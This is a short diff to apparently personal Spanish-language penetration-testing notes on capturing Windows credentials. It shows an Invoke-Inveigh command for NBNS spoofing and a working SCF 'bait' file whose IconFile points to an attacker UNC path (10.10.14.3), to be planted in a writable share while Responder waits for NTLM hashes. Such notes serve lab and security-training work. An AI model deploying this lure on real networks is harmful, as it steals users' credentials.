@@ -6,3 +6,15 @@ Desde powershell:
 
 Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 
+
+Tambien podemos poner una carnada:
+
+1)Creamos un archivo llamado @Inventory.scf  con el siguiente código y lo guardamos en una carpeta compartida donde tengamos poder
+ 
+[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+
+Luego prendemos el responder en nuestro linux y esperamos a que los usuarios se relacionen con el archivo
